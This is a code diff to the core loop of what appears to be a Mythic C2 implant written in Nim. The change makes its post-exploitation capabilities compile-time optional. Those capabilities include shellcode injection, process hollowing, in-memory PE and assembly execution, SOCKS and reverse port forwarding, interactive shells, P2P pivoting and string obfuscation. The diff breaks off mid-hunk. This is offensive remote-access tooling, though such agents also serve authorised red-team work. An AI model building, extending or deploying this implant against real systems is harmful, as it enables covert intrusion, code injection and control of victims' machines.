@@ -1,4 +1,4 @@
-import std/[json, random, os, base64, tables, times, strutils, strformat, asyncdispatch, sequtils]
+import std/[json, random, os, base64, tables, times, strformat, asyncdispatch]
 import config
 import global_data
 import profiles/http
@@ -6,73 +6,58 @@ import profiles/websocket
 import profiles/httpx
 import profiles/dns
 import profiles/tcp
-import utils/sysinfo
-import utils/m_responses
 import utils/debug
 import utils/strenc
 import utils/task_processor
-import tasks/exit
-import tasks/sleep
-import tasks/ls
-import tasks/download
-import tasks/upload
-import tasks/run
-import tasks/whoami
-import tasks/cat
-import tasks/mkdir
-import tasks/cp
-import tasks/mv
-import tasks/cd
-import tasks/ps
-import tasks/pwd
-import tasks/rm
-import tasks/pty
-import tasks/socks
-import tasks/rpfwd
-import tasks/redirect
-import tasks/getenv as taskGetenv
-import tasks/connect
 
-# Cross-platform commands
-import tasks/portscan
-import tasks/ifconfig
-import tasks/netstat
-import tasks/config as taskConfig
-import tasks/pkill
+# Cross-platform optional task imports
+when defined(cmd_sleep):
+  import tasks/sleep
+when defined(cmd_download):
+  import tasks/download
+when defined(cmd_upload):
+  import tasks/upload
+when defined(cmd_pty):
+  import tasks/pty
+when defined(cmd_socks):
+  import tasks/socks
+when defined(cmd_rpfwd):
+  import tasks/rpfwd
+when defined(cmd_connect):
+  import tasks/connect
+when defined(cmd_portscan):
+  import tasks/portscan
 
 when defined(windows):
-  import tasks/powershell as powershellTask
-  import tasks/link
+  when defined(cmd_powershell):
+    import tasks/powershell as powershellTask
+  when defined(cmd_link):
+    import tasks/link
   import profiles/smb
-  import tasks/execute_assembly
-  import tasks/inline_execute
-  import tasks/powerpick
-  import tasks/shinject
-  import tasks/make_token
-  import tasks/steal_token
-  import tasks/rev2self
-  import tasks/runas
-  import tasks/getsystem
-  import tasks/getprivs
-  import tasks/listpipes
-  import tasks/scshell
-  import tasks/spawnto_x64
-  import tasks/spawnto_x86
-  import tasks/ppid
-  import tasks/reg_query
-  import tasks/reg_write_value
-  import tasks/net_dclist
-  import tasks/net_localgroup
-  import tasks/net_localgroup_member
-  import tasks/net_shares
-  import tasks/screenshot
-  import tasks/get_av
-  import tasks/clipboard
-  import tasks/clipboard_monitor
-  import tasks/donut
-  import tasks/inject_hollow
-  import tasks/run_pe
-  import tasks/powershell_import
+  when defined(cmd_execute_assembly):
+    import tasks/execute_assembly
+  when defined(cmd_inline_execute):
+    import tasks/inline_execute
+  when defined(cmd_shinject):
+    import tasks/shinject
+  when defined(cmd_screenshot):
+    import tasks/screenshot
+  when defined(cmd_clipboard_monitor):
+    import tasks/clipboard_monitor
+  when defined(cmd_donut):
+    import tasks/donut
+  when defined(cmd_inject_hollow):
+    import tasks/inject_hollow
+  when defined(cmd_run_pe):
+    import tasks/run_pe
+  when defined(cmd_powershell_import):
+    import tasks/powershell_import
+  when defined(cmd_spawn):
+    import tasks/spawn
+  when defined(cmd_spawnas):
+    import tasks/spawnas
+  when defined(cmd_register_file):
+    import tasks/register_file
 
 when defined(windows):
   when defined(sleepObfuscationEkko):
@@ -80,7 +65,7 @@ when defined(windows):
 
 type
   BackgroundTaskType = enum
-    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow, btRunPE, btPowershellImport
+    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow, btRunPE, btPowershellImport, btRegisterFile, btSpawn, btSpawnAs
   
   BackgroundTaskState = object
     taskType: BackgroundTaskType
@@ -173,7 +158,7 @@ proc setAesDecKey(profile: var Profile, key: seq[byte]) =
     when defined(windows):
       profile.smbProfile.setAesDecKey(key)
 
-proc hasAesKey(profile: Profile): bool =
+proc hasAesKey(profile: Profile): bool {.used.} =
   case profile.kind
   of pkHttp:
     result = profile.httpProfile.hasAesKey()
@@ -360,7 +345,7 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
   var p2pDelegates: seq[JsonNode] = @[]
   var p2pEdges: seq[JsonNode] = @[]
   
-  let connectResps = checkActiveConnectConnections()
+  let connectResps = when defined(cmd_connect): checkActiveConnectConnections() else: newSeq[JsonNode]()
   for resp in connectResps:
     if resp.hasKey(obf("delegates")):
       for d in resp[obf("delegates")].getElems():
@@ -372,7 +357,7 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
           edgeCopy[obf("source")] = %agent.callbackUuid
         p2pEdges.add(edgeCopy)
   
-  when defined(windows):
+  when defined(windows) and defined(cmd_link):
     let linkResps = checkActiveLinkConnections()
     for resp in linkResps:
       if resp.hasKey(obf("delegates")):
@@ -440,36 +425,45 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
 
 proc processInteractive*(agent: var Agent, interactive: seq[JsonNode]) =
   ## Process interactive messages (PTY input from Mythic)
-  for msg in interactive:
-    let taskId = msg[obf("task_id")].getStr()
-    debug "[DEBUG] Processing interactive message for task " & taskId
-    
-    # Create array with single message for handler
-    let response = handlePtyInteractive(taskId, @[msg])
-    if response.len > 0:
-      agent.taskResponses.add(response)
+  when defined(cmd_pty):
+    for msg in interactive:
+      let taskId = msg[obf("task_id")].getStr()
+      debug "[DEBUG] Processing interactive message for task " & taskId
+      
+      # Create array with single message for handler
+      let response = handlePtyInteractive(taskId, @[msg])
+      if response.len > 0:
+        agent.taskResponses.add(response)
+  else:
+    discard
 
 proc processSocks*(agent: var Agent, socksMessages: seq[JsonNode]) =
   ## Process SOCKS messages (data forwarding from Mythic)
-  if socksMessages.len > 0:
-    debug "[DEBUG] Processing " & $socksMessages.len & " SOCKS message(s)"
-    
-    # Handle all SOCKS messages and get responses to send back
-    let responses = handleSocksMessages(socksMessages)
-    for response in responses:
-      # Wrap each SOCKS message in the format expected by postResponses
-      agent.taskResponses.add(%*{obf("socks"): [response]})
+  when defined(cmd_socks):
+    if socksMessages.len > 0:
+      debug "[DEBUG] Processing " & $socksMessages.len & " SOCKS message(s)"
+      
+      # Handle all SOCKS messages and get responses to send back
+      let responses = handleSocksMessages(socksMessages)
+      for response in responses:
+        # Wrap each SOCKS message in the format expected by postResponses
+        agent.taskResponses.add(%*{obf("socks"): [response]})
+  else:
+    discard
 
 proc processRpfwd*(agent: var Agent, rpfwdMessages: seq[JsonNode]) =
   ## Process RPfwd messages (data forwarding from Mythic)
-  if rpfwdMessages.len > 0:
-    debug "[DEBUG] Processing " & $rpfwdMessages.len & " rpfwd message(s)"
-    
-    # Handle all RPfwd messages and get responses to send back
-    let responses = handleRpfwdMessages(rpfwdMessages)
-    for response in responses:
-      # Wrap each RPfwd message in the format expected by postResponses
-      agent.taskResponses.add(%*{obf("rpfwd"): [response]})
+  when defined(cmd_rpfwd):
+    if rpfwdMessages.len > 0:
+      debug "[DEBUG] Processing " & $rpfwdMessages.len & " rpfwd message(s)"
+      
+      # Handle all RPfwd messages and get responses to send back
+      let responses = handleRpfwdMessages(rpfwdMessages)
+      for response in responses:
+        # Wrap each RPfwd message in the format expected by postResponses
+        agent.taskResponses.add(%*{obf("rpfwd"): [response]})
+  else:
+    discard
 
 proc processDelegates*(agent: var Agent, delegates: seq[JsonNode]) =
   ## Process delegate messages (P2P agent communications)
@@ -485,9 +479,16 @@ proc processDelegates*(agent: var Agent, delegates: seq[JsonNode]) =
         debug "[DEBUG] Delegate message for linked agent: ", uuid
         
         # Try to forward to connect connection (TCP)
-        if not forwardDelegateToConnect(uuid, message):
-          # Try to forward to link connection (SMB - Windows only)
-          when defined(windows):
+        when defined(cmd_connect):
+          if not forwardDelegateToConnect(uuid, message):
+            # Try to forward to link connection (SMB - Windows only)
+            when defined(cmd_link) and defined(windows):
+              if not forwardDelegateToLink(uuid, message):
+                debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
+            else:
+              debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
+        else:
+          when defined(cmd_link) and defined(windows):
             if not forwardDelegateToLink(uuid, message):
               debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
           else:
@@ -502,8 +503,9 @@ proc processDelegates*(agent: var Agent, delegates: seq[JsonNode]) =
           
           if newUuid != uuid:
             debug "[DEBUG] Mythic assigned new UUID via get_tasking: ", newUuid, " (old: ", uuid, ")"
-            discard rekeyConnectConnection(uuid, newUuid)
-            when defined(windows):
+            when defined(cmd_connect):
+              discard rekeyConnectConnection(uuid, newUuid)
+            when defined(cmd_link) and defined(windows):
               discard rekeyLinkConnection(uuid, newUuid)
       else:
         debug "[DEBUG] Malformed delegate message - missing uuid or message"
@@ -539,9 +541,17 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
     
     # Handle sleep command specially (needs to modify agent state)
     if command == obf("sleep"):
-      let sleepResult = executeSleep(params, agent.sleepInterval, agent.jitter)
-      sleepResult[obf("task_id")] = %taskId
-      agent.taskResponses.add(sleepResult)
+      when defined(cmd_sleep):
+        let sleepResult = executeSleep(params, agent.sleepInterval, agent.jitter)
+        sleepResult[obf("task_id")] = %taskId
+        agent.taskResponses.add(sleepResult)
+      else:
+        agent.taskResponses.add(%*{
+          obf("task_id"): taskId,
+          obf("user_output"): obf("Command 'sleep' not compiled into this agent"),
+          obf("completed"): true,
+          obf("status"): obf("error")
+        })
       continue
     
     # Handle background tasks that need state tracking
@@ -550,32 +560,34 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       
       case command
       of obf("download"):
-        var state = BackgroundTaskState(
-          taskType: btDownload,
-          path: params[obf("path")].getStr(),
-          fileId: "",
-          totalChunks: execResult.response[obf("download")][obf("total_chunks")].getInt(),
-          currentChunk: 0
-        )
-        agent.backgroundTasks[taskId] = state
+        when defined(cmd_download):
+          var state = BackgroundTaskState(
+            taskType: btDownload,
+            path: params[obf("path")].getStr(),
+            fileId: "",
+            totalChunks: execResult.response[obf("download")][obf("total_chunks")].getInt(),
+            currentChunk: 0
+          )
+          agent.backgroundTasks[taskId] = state
       
       of obf("upload"):
-        let uploadPath = if execResult.response.hasKey(obf("upload")):
-          execResult.response[obf("upload")][obf("full_path")].getStr()
-        else:
-          params[obf("remote_path")].getStr()
-        
-        var state = BackgroundTaskState(
-          taskType: btUpload,
-          path: uploadPath,
-          fileId: params[obf("file")].getStr(),
-          totalChunks: 0,
-          currentChunk: 1
-        )
-        agent.backgroundTasks[taskId] = state
+        when defined(cmd_upload):
+          let uploadPath = if execResult.response.hasKey(obf("upload")):
+            execResult.response[obf("upload")][obf("full_path")].getStr()
+          else:
+            params[obf("remote_path")].getStr()
+          
+          var state = BackgroundTaskState(
+            taskType: btUpload,
+            path: uploadPath,
+            fileId: params[obf("file")].getStr(),
+            totalChunks: 0,
+            currentChunk: 1
+          )
+          agent.backgroundTasks[taskId] = state
       
       of obf("execute_assembly"):
-        when defined(windows):
+        when defined(cmd_execute_assembly) and defined(windows):
           var state = BackgroundTaskState(
             taskType: btExecuteAssembly,
             path: "",
@@ -588,7 +600,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           agent.backgroundTasks[taskId] = state
       
       of obf("inline_execute"):
-        when defined(windows):
+        when defined(cmd_inline_execute) and defined(windows):
           var state = BackgroundTaskState(
             taskType: btInlineExecute,
             path: "",
@@ -601,7 +613,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           agent.backgroundTasks[taskId] = state
       
       of obf("shinject"):
-        when defined(windows):
+        when defined(cmd_shinject) and defined(windows):
           var state = BackgroundTaskState(
             taskType: btShinject,
             path: "",
@@ -614,7 +626,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           agent.backgroundTasks[taskId] = state
       
       of obf("donut"):
-        when defined(windows):
+        when defined(cmd_donut) and defined(windows):
           var state = BackgroundTaskState(
             taskType: btDonut,
             path: "",
@@ -627,7 +639,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           agent.backgroundTasks[taskId] = state
       
       of obf("inject_hollow"):
-        when defined(windows):
+        when defined(cmd_inject_hollow) and defined(windows):
           var state = BackgroundTaskState(
             taskType: btInjectHollow,
             path: "",
@@ -640,7 +652,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           agent.backgroundTasks[taskId] = state
       
       of obf("run_pe"):
-        when defined(windows):
+        when defined(cmd_run_pe) and defined(windows):
           var state = BackgroundTaskState(
             taskType: btRunPE,
             path: "",
@@ -652,18 +664,57 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           )
           agent.backgroundTasks[taskId] = state
       
+      of obf("spawn"):
+        when defined(cmd_spawn) and defined(windows):
+          var state = BackgroundTaskState(
+            taskType: btSpawn,
+            path: "",
+            fileId: params[obf("uuid")].getStr(),
+            totalChunks: 0,
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+      
+      of obf("spawnas"):
+        when defined(cmd_spawnas) and defined(windows):
+          var state = BackgroundTaskState(
+            taskType: btSpawnAs,
+            path: "",
+            fileId: params[obf("uuid")].getStr(),
+            totalChunks: 0,
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+      
       of obf("screenshot"):
-        when defined(windows):
+        when defined(cmd_screenshot) and defined(windows):
           # Screenshot doesn't use BackgroundTaskState, handled elsewhere
           discard
       
       of obf("powershell_import"):
-        when defined(windows):
+        when defined(cmd_powershell_import) and defined(windows):
           let fileName = params[obf("file_name")].getStr()
           var state = BackgroundTaskState(
             taskType: btPowershellImport,
             path: fileName,
             fileId: params[obf("file")].getStr(),
+            totalChunks: 0,
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+      
+      of obf("register_file"):
+        when defined(cmd_register_file) and defined(windows):
+          var state = BackgroundTaskState(
+            taskType: btRegisterFile,
+            path: "",
+            fileId: params[obf("uuid")].getStr(),
             totalChunks: 0,
             currentChunk: 1,
             fileData: @[],
@@ -687,10 +738,11 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
     # Handle monitoring tasks (clipboard_monitor, portscan)
     case command
     of obf("clipboard_monitor"):
-      when defined(windows):
+      when defined(cmd_clipboard_monitor) and defined(windows):
         agent.activeMonitoringTasks[taskId] = mtClipboardMonitor
     of obf("portscan"):
-      agent.activeMonitoringTasks[taskId] = mtPortscan
+      when defined(cmd_portscan):
+        agent.activeMonitoringTasks[taskId] = mtPortscan
     else:
       discard
     
@@ -708,10 +760,11 @@ proc checkBackgroundTasks*(agent: var Agent) =
     
     case taskType
     of mtClipboardMonitor:
-      when defined(windows):
+      when defined(cmd_clipboard_monitor) and defined(windows):
         result = checkClipboardMonitor(taskId)
     of mtPortscan:
-      result = checkPortscan(taskId)
+      when defined(cmd_portscan):
+        result = checkPortscan(taskId)
     
     if result != nil:
       agent.taskResponses.add(result)
@@ -742,7 +795,6 @@ proc postResponses*(agent: var Agent) =
   for resp in agent.taskResponses:
     if resp.hasKey(obf("interactive")):
       # Extract interactive messages and add to top-level array
-      let taskId = resp[obf("task_id")].getStr()
       let messages = resp[obf("interactive")].getElems()
       for msg in messages:
         interactiveMessages.add(msg)
@@ -838,8 +890,9 @@ proc postResponses*(agent: var Agent) =
             debug "[DEBUG] Received delegate for ", delegateUuid, " (", delegateMessage.len, " bytes base64)"
             
             # Forward delegate message to the P2P agent FIRST (using old UUID)
-            discard forwardDelegateToConnect(delegateUuid, delegateMessage)
-            when defined(windows):
+            when defined(cmd_connect):
+              discard forwardDelegateToConnect(delegateUuid, delegateMessage)
+            when defined(cmd_link) and defined(windows):
               discard forwardDelegateToLink(delegateUuid, delegateMessage)
             
             # THEN check if Mythic assigned a new UUID and re-key for future messages
@@ -853,8 +906,9 @@ proc postResponses*(agent: var Agent) =
                 debug "[DEBUG] Mythic assigned new UUID: ", newUuid, " (old: ", delegateUuid, ")"
                 debug "[DEBUG] Re-keying connection for future messages"
                 # Re-key the connection from old UUID to new UUID for future messages
-                discard rekeyConnectConnection(delegateUuid, newUuid)
-                when defined(windows):
+                when defined(cmd_connect):
+                  discard rekeyConnectConnection(delegateUuid, newUuid)
+                when defined(cmd_link) and defined(windows):
                   discard rekeyLinkConnection(delegateUuid, newUuid)
           except:
             debug "[DEBUG] Failed to forward delegate: ", getCurrentExceptionMsg()
@@ -869,69 +923,71 @@ proc postResponses*(agent: var Agent) =
             
             case state.taskType
             of btDownload:
-              # Got file_id, now send chunks
-              if state.fileId.len == 0 and taskResp.hasKey(obf("file_id")):
-                state.fileId = taskResp[obf("file_id")].getStr()
-                agent.backgroundTasks[taskId] = state
-                debug "[DEBUG] Download got file_id: ", state.fileId
-              
-              # Send next chunk
-              if state.currentChunk < state.totalChunks:
-                state.currentChunk += 1
+              when defined(cmd_download):
+                # Got file_id, now send chunks
+                if state.fileId.len == 0 and taskResp.hasKey(obf("file_id")):
+                  state.fileId = taskResp[obf("file_id")].getStr()
+                  agent.backgroundTasks[taskId] = state
+                  debug "[DEBUG] Download got file_id: ", state.fileId
                 
-                # Differentiate between file download and screenshot (in-memory data)
-                let chunkResp = if state.fileData.len > 0:
-                  # Screenshot - process from memory (Windows only)
-                  when defined(windows):
-                    processScreenshotChunk(taskId, state.fileId, state.fileData, state.currentChunk)
-                  else:
-                    # Should never happen on non-Windows, but return error
-                    %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Screenshot not supported")}
-                else:
-                  # File download - read from disk
-                  processDownloadChunk(taskId, state.fileId, state.path, state.currentChunk)
-                
-                agent.taskResponses.add(chunkResp)
-                
-                # Check if this was the last chunk
-                if state.currentChunk >= state.totalChunks:
-                  let completeMsg = if state.fileData.len > 0:
-                    # Screenshot complete (Windows only)
-                    when defined(windows):
-                      completeScreenshot(taskId, state.fileId)
+                # Send next chunk
+                if state.currentChunk < state.totalChunks:
+                  state.currentChunk += 1
+                  
+                  # Differentiate between file download and screenshot (in-memory data)
+                  let chunkResp = if state.fileData.len > 0:
+                    # Screenshot - process from memory (Windows only)
+                    when defined(cmd_screenshot) and defined(windows):
+                      processScreenshotChunk(taskId, state.fileId, state.fileData, state.currentChunk)
                     else:
+                      # Should never happen on non-Windows, but return error
                       %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Screenshot not supported")}
                   else:
-                    # File download complete
-                    completeDownload(taskId, state.fileId, state.path)
+                    # File download - read from disk
+                    processDownloadChunk(taskId, state.fileId, state.path, state.currentChunk)
                   
-                  agent.taskResponses.add(completeMsg)
-                  agent.backgroundTasks.del(taskId)
-                  debug "[DEBUG] ", (if state.fileData.len > 0: "Screenshot" else: "Download"), " complete"
-                else:
-                  agent.backgroundTasks[taskId] = state
+                  agent.taskResponses.add(chunkResp)
+                  
+                  # Check if this was the last chunk
+                  if state.currentChunk >= state.totalChunks:
+                    let completeMsg = if state.fileData.len > 0:
+                      # Screenshot complete (Windows only)
+                      when defined(cmd_screenshot) and defined(windows):
+                        completeScreenshot(taskId, state.fileId)
+                      else:
+                        %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Screenshot not supported")}
+                    else:
+                      # File download complete
+                      completeDownload(taskId, state.fileId, state.path)
+                    
+                    agent.taskResponses.add(completeMsg)
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] ", (if state.fileData.len > 0: "Screenshot" else: "Download"), " complete"
+                  else:
+                    agent.backgroundTasks[taskId] = state
             
             of btUpload:
-              # Process incoming chunks
-              if taskResp.hasKey(obf("chunk_data")):
-                let chunkData = taskResp[obf("chunk_data")].getStr()
-                let totalChunks = taskResp[obf("total_chunks")].getInt()
-                state.totalChunks = totalChunks
-                
-                let isFirstChunk = (state.currentChunk == 1)
-                let uploadResp = processUploadChunk(taskId, state.fileId, state.path, 
-                                                     state.currentChunk, chunkData, totalChunks, isFirstChunk)
-                agent.taskResponses.add(uploadResp)
-                
-                if uploadResp.hasKey(obf("completed")) and uploadResp[obf("completed")].getBool():
-                  agent.backgroundTasks.del(taskId)
-                  debug "[DEBUG] Upload complete"
-                else:
-                  state.currentChunk += 1
-                  agent.backgroundTasks[taskId] = state
+              when defined(cmd_upload):
+                # Process incoming chunks
+                if taskResp.hasKey(obf("chunk_data")):
+                  let chunkData = taskResp[obf("chunk_data")].getStr()
+                  let totalChunks = taskResp[obf("total_chunks")].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  let isFirstChunk = (state.currentChunk == 1)
+                  let uploadResp = processUploadChunk(taskId, state.fileId, state.path, 
+                                                       state.currentChunk, chunkData, totalChunks, isFirstChunk)
+                  agent.taskResponses.add(uploadResp)
+                  
+                  if uploadResp.hasKey(obf("completed")) and uploadResp[obf("completed")].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] Upload complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
             
             of btExecuteAssembly:
-              when defined(windows):
+              when defined(cmd_execute_assembly) and defined(windows):
                 # Process incoming file chunks for execute-assembly
                 if taskResp.hasKey(obf("chunk_data")):
                   let chunkData = taskResp[obf("chunk_data")].getStr()
@@ -953,7 +1009,7 @@ proc postResponses*(agent: var Agent) =
                     agent.backgroundTasks[taskId] = state
             
             of btInlineExecute:
-              when defined(windows):
+              when defined(cmd_inline_execute) and defined(windows):
                 # Process incoming file chunks for inline_execute (BOF)
                 if taskResp.hasKey(obf("chunk_data")):
                   let chunkData = taskResp[obf("chunk_data")].getStr()
@@ -975,7 +1031,7 @@ proc postResponses*(agent: var Agent) =
                     agent.backgroundTasks[taskId] = state
             
             of btShinject:
-              when defined(windows):
+              when defined(cmd_shinject) and defined(windows):
                 # Process incoming file chunks for shinject
                 if taskResp.hasKey(obf("chunk_data")):
                   let chunkData = taskResp[obf("chunk_data")].getStr()
@@ -997,7 +1053,7 @@ proc postResponses*(agent: var Agent) =
                     agent.backgroundTasks[taskId] = state
             
             of btDonut:
-              when defined(windows):
+              when defined(cmd_donut) and defined(windows):
                 # Process incoming file chunks for donut shellcode
                 if taskResp.hasKey(obf("chunk_data")):
                   let chunkData = taskResp[obf("chunk_data")].getStr()
@@ -1019,7 +1075,7 @@ proc postResponses*(agent: var Agent) =
                     agent.backgroundTasks[taskId] = state
             
             of btInjectHollow:
-              when defined(windows):
+              when defined(cmd_inject_hollow) and defined(windows):
                 # Process incoming file chunks for inject_hollow shellcode
                 if taskResp.hasKey(obf("chunk_data")):
                   let chunkData = taskResp[obf("chunk_data")].getStr()
@@ -1041,7 +1097,7 @@ proc postResponses*(agent: var Agent) =
                     agent.backgroundTasks[taskId] = state
             
             of btRunPE:
-              when defined(windows):
+              when defined(cmd_run_pe) and defined(windows):
                 # Process incoming file chunks for run_pe
                 if taskResp.hasKey(obf("chunk_data")):
                   let chunkData = taskResp[obf("chunk_data")].getStr()
@@ -1062,8 +1118,50 @@ proc postResponses*(agent: var Agent) =
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
             
+            of btSpawn:
+              when defined(cmd_spawn) and defined(windows):
+                # Process incoming file chunks for spawn payload
+                if taskResp.hasKey(obf("chunk_data")):
+                  let chunkData = taskResp[obf("chunk_data")].getStr()
+                  let totalChunks = taskResp[obf("total_chunks")].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  let spawnResp = processSpawnChunk(
+                    taskId, state.params, chunkData, totalChunks, 
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(spawnResp)
+                  
+                  if spawnResp.hasKey(obf("completed")) and spawnResp[obf("completed")].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] Spawn complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
+            
+            of btSpawnAs:
+              when defined(cmd_spawnas) and defined(windows):
+                # Process incoming file chunks for spawnas payload
+                if taskResp.hasKey(obf("chunk_data")):
+                  let chunkData = taskResp[obf("chunk_data")].getStr()
+                  let totalChunks = taskResp[obf("total_chunks")].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  let spawnasResp = processSpawnAsChunk(
+                    taskId, state.params, chunkData, totalChunks, 
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(spawnasResp)
+                  
+                  if spawnasResp.hasKey(obf("completed")) and spawnasResp[obf("completed")].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] SpawnAs complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
+            
             of btPowershellImport:
-              when defined(windows):
+              when defined(cmd_powershell_import) and defined(windows):
                 # Process incoming file chunks for powershell_import
                 if taskResp.hasKey(obf("chunk_data")):
                   let chunkData = taskResp[obf("chunk_data")].getStr()
@@ -1082,31 +1180,55 @@ proc postResponses*(agent: var Agent) =
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
+            
+            of btRegisterFile:
+              when defined(cmd_register_file) and defined(windows):
+                # Process incoming file chunks for register_file (caching)
+                if taskResp.hasKey(obf("chunk_data")):
+                  let chunkData = taskResp[obf("chunk_data")].getStr()
+                  let totalChunks = taskResp[obf("total_chunks")].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  let cacheResp = processRegisterFileChunk(
+                    taskId, state.params, chunkData, totalChunks,
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(cacheResp)
+                  
+                  if cacheResp.hasKey(obf("completed")) and cacheResp[obf("completed")].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] Register file complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
       
       # Process socks messages from post_response reply
       # Mythic can include socks data in ANY response, not just get_tasking
       # Without this, socks messages queued during postResponses round-trip are dropped
-      if respJson.hasKey(obf("socks")):
-        let socksMessages = respJson[obf("socks")].getElems()
-        if socksMessages.len > 0:
-          debug "[DEBUG] Processing ", socksMessages.len, " socks message(s) from post_response reply"
-          let responses = handleSocksMessages(socksMessages)
-          for response in responses:
-            agent.taskResponses.add(%*{obf("socks"): [response]})
+      when defined(cmd_socks):
+        if respJson.hasKey(obf("socks")):
+          let socksMessages = respJson[obf("socks")].getElems()
+          if socksMessages.len > 0:
+            debug "[DEBUG] Processing ", socksMessages.len, " socks message(s) from post_response reply"
+            let responses = handleSocksMessages(socksMessages)
+            for response in responses:
+              agent.taskResponses.add(%*{obf("socks"): [response]})
       
       # Process rpfwd messages from post_response reply
-      if respJson.hasKey(obf("rpfwd")):
-        let rpfwdMessages = respJson[obf("rpfwd")].getElems()
-        if rpfwdMessages.len > 0:
-          debug "[DEBUG] Processing ", rpfwdMessages.len, " rpfwd message(s) from post_response reply"
-          agent.processRpfwd(rpfwdMessages)
+      when defined(cmd_rpfwd):
+        if respJson.hasKey(obf("rpfwd")):
+          let rpfwdMessages = respJson[obf("rpfwd")].getElems()
+          if rpfwdMessages.len > 0:
+            debug "[DEBUG] Processing ", rpfwdMessages.len, " rpfwd message(s) from post_response reply"
+            agent.processRpfwd(rpfwdMessages)
       
       # Process interactive messages from post_response reply
-      if respJson.hasKey(obf("interactive")):
-        let interactiveMessages = respJson[obf("interactive")].getElems()
-        if interactiveMessages.len > 0:
-          debug "[DEBUG] Processing ", interactiveMessages.len, " interactive message(s) from post_response reply"
-          agent.processInteractive(interactiveMessages)
+      when defined(cmd_pty):
+        if respJson.hasKey(obf("interactive")):
+          let interactiveMessages = respJson[obf("interactive")].getElems()
+          if interactiveMessages.len > 0:
+            debug "[DEBUG] Processing ", interactiveMessages.len, " interactive message(s) from post_response reply"
+            agent.processInteractive(interactiveMessages)
 
     except:
       debug "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()
@@ -1241,33 +1363,37 @@ proc runAgent*() =
     agentInstance.processTasks(tasks)
     
     # Check active PTY sessions for output (non-blocking via threads)
-    let ptyResponses = checkActivePtySessions()
-    for response in ptyResponses:
-      agentInstance.taskResponses.add(response)
+    when defined(cmd_pty):
+      let ptyResponses = checkActivePtySessions()
+      for response in ptyResponses:
+        agentInstance.taskResponses.add(response)
     
     # Check active PowerShell sessions for output (non-blocking via threads)
-    when defined(windows):
+    when defined(windows) and defined(cmd_powershell):
       let psResponses = powershellTask.checkActivePsSessions()
       for response in psResponses:
         agentInstance.taskResponses.add(response)
     
     # Check active SOCKS connections for data (non-blocking via threads)
-    let socksResponses = checkActiveSocksConnections()
-    for response in socksResponses:
-      agentInstance.taskResponses.add(%*{obf("socks"): [response]})
+    when defined(cmd_socks):
+      let socksResponses = checkActiveSocksConnections()
+      for response in socksResponses:
+        agentInstance.taskResponses.add(%*{obf("socks"): [response]})
     
     # Check active RPfwd connections for data (non-blocking via threads)
-    let rpfwdResponses = checkActiveRpfwdConnections()
-    for response in rpfwdResponses:
-      agentInstance.taskResponses.add(%*{obf("rpfwd"): [response]})
+    when defined(cmd_rpfwd):
+      let rpfwdResponses = checkActiveRpfwdConnections()
+      for response in rpfwdResponses:
+        agentInstance.taskResponses.add(%*{obf("rpfwd"): [response]})
     
     # Check active connect connections for data (non-blocking via threads)
-    let connectResponses = checkActiveConnectConnections()
-    for response in connectResponses:
-      agentInstance.taskResponses.add(response)
+    when defined(cmd_connect):
+      let connectResponses = checkActiveConnectConnections()
+      for response in connectResponses:
+        agentInstance.taskResponses.add(response)
     
     # Check active link connections for data (non-blocking via threads) - Windows only
-    when defined(windows):
+    when defined(windows) and defined(cmd_link):
       let linkResponses = checkActiveLinkConnections()
       for response in linkResponses:
         agentInstance.taskResponses.add(response)
@@ -1284,12 +1410,13 @@ proc runAgent*() =
       os.sleep(200)  # Brief delay for P2P agents to respond
       var hasP2pData = false
       
-      let pollConnectResps = checkActiveConnectConnections()
-      for response in pollConnectResps:
